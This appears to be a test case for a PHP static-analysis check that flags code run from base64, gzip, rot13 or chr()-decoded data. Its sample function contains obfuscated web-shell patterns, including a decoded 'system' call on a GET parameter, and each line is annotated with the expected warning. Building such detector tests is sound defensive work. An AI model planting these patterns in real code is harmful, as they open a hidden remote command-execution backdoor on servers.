===description===
Code to run, or a function name to call, decoded from base64, compressed data,
rot13 or `chr()` chains is how web shells hide.
===config===
<mir>
  <issueHandlers>
    <MixedArgument errorLevel="suppress"/>
    <MixedArrayAccess errorLevel="suppress"/>
    <PossiblyFalseArgument errorLevel="suppress"/>
    <PossiblyInvalidArgument errorLevel="suppress"/>
    <TaintedCallable errorLevel="suppress"/>
  </issueHandlers>
</mir>
===file===
<?php
function backdoor(): void {
    eval(gzinflate(base64_decode('S03OyFfIzy9KUQQA')));
//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ObfuscatedCode: Code run from decoded data — the shape of a web shell or backdoor
    $f = base64_decode('c3lzdGVt');
    $f($_GET['c']);
//  ^^^^^^^^^^^^^^ ObfuscatedCode: Code run from decoded data — the shape of a web shell or backdoor
    call_user_func(str_rot13('flfgrz'), 'id');
//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ObfuscatedCode: Code run from decoded data — the shape of a web shell or backdoor
    $g = chr(115) . chr(121) . chr(115) . 'tem';
    $g('id');
//  ^^^^^^^^ ObfuscatedCode: Code run from decoded data — the shape of a web shell or backdoor
}
